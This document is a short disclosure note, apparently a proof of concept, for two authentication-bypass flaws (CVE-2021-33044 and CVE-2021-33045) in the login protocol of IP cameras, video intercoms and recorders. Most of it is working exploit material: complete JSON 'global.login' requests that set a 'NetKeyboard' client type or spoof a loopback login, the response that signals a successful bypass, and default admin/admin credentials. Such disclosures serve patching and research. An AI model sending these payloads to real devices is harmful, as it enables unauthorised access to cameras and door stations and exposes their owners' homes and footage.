-=[NetKeyboard Vulnerability]=-

CVE-2021-33044

Vulnerability:
        "clientType": "NetKeyboard",
Vulnerable device types: IPC/VTH/VTO (tested)
Vulnerable Firmware: Those devices who do not support "NetKeyboard" functionality (older than June 2021)
Protocol: DHIP and HTTP/HTTPS

Details:
Setting above "Vulnerability" on "Vulnerable device types" during 1st or 2nd "global.login" sequence will simply bypass
authentication.

Successful bypass returns: {"id":1,"params":{"keepAliveInterval":60},"result":true,"session":<sessionID>}

[Example]
{
    "method": "global.login",
    "params":
    {
        "userName": "admin",
        "loginType": "Direct",
        "clientType": "NetKeyboard",
        "authorityType": "Default",
        "passwordType": "Default",
        "password": "Not Used"
    },
    "id": 1,
    "session": 0
}

-=[Loopback Vulnerability]=-

CVE-2021-33045

Vulnerability:
        "ipAddr": "127.0.0.1",
        "loginType": "Loopback",
        "clientType": "Local",

Vulnerable device types: IPC/VTH/VTO/NVR/DVR (tested)
Vulnerable Firmware: Firmware version older than beginning/mid 2020.
Protocol: DHIP

Details:
Setting above "Vulnerability" on "Vulnerable device types" during 1st or 2nd "global.login" sequence pretends that the
login request comes from "loopback" and will therefore bypass legitimate authentication.

Successful bypass returns: {"id":1,"params":{"keepAliveInterval":60},"result":true,"session":<sessionID>}

[Example]
Random MD5 with l/p: admin/admin
{
    "method": "global.login",
    "params":
    {
        "userName": "admin",
        "ipAddr": "127.0.0.1",
        "loginType": "Loopback",
        "clientType": "Local",
        "authorityType": "Default",
        "passwordType": "Default",
        "password": "[REDACTED]"
    },
    "id": 1,
    "session": 0
}

Plain text with l/p: admin/admin
{
    "method": "global.login",
    "params":
    {
        "userName": "admin",
        "ipAddr": "127.0.0.1",
        "loginType": "Loopback",
        "clientType": "Local",
        "authorityType": "Default",
        "passwordType": "Plain",
        "password": "admin"
    },
    "id": 1,
    "session": 0
}
